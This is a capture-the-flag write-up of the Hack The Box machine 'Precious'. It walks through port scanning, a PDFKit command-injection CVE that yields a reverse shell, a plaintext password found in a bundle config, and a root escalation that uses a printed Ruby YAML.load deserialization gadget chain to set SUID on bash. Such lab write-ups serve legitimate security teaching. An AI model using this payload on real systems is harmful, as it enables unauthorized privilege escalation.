# HTB - Precious

#### Ip: 10.10.11.189
#### Name: Precious
#### Difficulty: Easy

----------------------------------------------------------------------

Precious.png

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions:

```text
┌──(ryan㉿kali)-[~/HTB/Precious]
└─$ sudo nmap -p-  --min-rate 10000 10.10.11.189 -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-11 16:15 CDT
Nmap scan report for 10.10.11.189
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds
```

Lets add precious.htb to our `/etc/hosts` file.

Heading to the site on port 80 we find a webpage to pdf converter:

site.png

Lets test this out. I'll create a file called test.txt:

```text
┌──(ryan㉿kali)-[~/HTB/Precious]
└─$ cat >> test.txt        
hi!
```

And also set up a Python HTTP server using `python -m http.server 80`

In the input field on the site I type: http://10.10.14.72/test.txt

Which fetched the file from my Python server and generates a PDF of my file:

hi.pdf

Lets download this PDF and use exiftool to take a look at the metadata:

exiftool.png

Cool, looks like we've discovered what technology is being used to generate the PDFs.

Searching for exploits I find: https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell

git.png

Lets give this a shot!

### Exploitation

Updating the bolded values and setting up a NetCat listener I can catch a shell back as user Ruby:

shell.png

Trying to grab the flag in user henry's `/home` folder we get an access denied error:

```text
ruby@precious:/home/henry$ ls
user.txt
ruby@precious:/home/henry$ cat user.txt
cat: user.txt: Permission denied
```

Looking around a bit more we find an interesting hidden directory in ruby's files:

```text
ruby@precious:/home$ cd ruby/
ruby@precious:~$ ls
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Sep 11 17:19 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 4 ruby ruby 4096 Sep 11 17:19 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ cd .bundle
ruby@precious:~/.bundle$ ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .
drwxr-xr-x 4 ruby ruby 4096 Sep 11 17:19 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Cool, this looks like henry's password. Lets `su henry` and grab the first flag:

```text
ruby@precious:~/.bundle$ su henry
Password: 
henry@precious:/home/ruby/.bundle$ whoami
henry
```

user_flag.png

### Privilege Escalation

Running `sudo -l` to see what henry can run with elevated permissions:

```text
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Interesting, Taking a look at the file we see it is utilizing YAML.load, which is vulnerable to deserialization:

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

YAML.load is calling a file called dependiencies.yml. We can create our own dependencies.yml file and get code execution using git_set. I grabbed the base of this code from https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=blog.stratumsecurity.com#file-ruby_yaml_load_sploit2-yaml:

```text
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod +s /bin/bash
         method_id: :resolve
```

Here I'm setting the SUID bit on bash.

We can execute the script, which will also run our malicious dependencies.yml file:

```text
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
    33: from /opt/update_dependencies.rb:17:in `<main>'
    32: from /opt/update_dependencies.rb:10:in `list_from_file'
    31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
    30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
    29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
    28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
    27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
    26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
    25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
    24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
    23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
    22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
    21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
    20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
    19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
    18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
    17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
    16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
    15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
    14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
    13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
    12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
    11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
    10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
     9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
     8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
     7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
     6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
     5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
     4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
     3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
     2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
     1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
henry@precious:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# id
uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)
```

Nice that worked! 

We can now grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

-----------------------------------------------------------